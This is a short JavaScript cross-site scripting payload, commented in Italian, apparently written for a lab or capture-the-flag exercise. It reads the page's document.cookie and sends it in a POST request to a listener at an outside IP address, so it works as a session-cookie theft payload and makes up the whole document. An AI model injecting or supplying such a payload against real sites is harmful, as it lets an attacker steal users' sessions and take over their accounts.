<script>// Legge i cookie del documento
let sessionCookie = document.cookie;
// Incorpora il cookie in una richiesta fetch
fetch('http://10.10.16.25:8000/collect', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: 'cookie=' + encodeURIComponent(sessionCookie)
});
</script>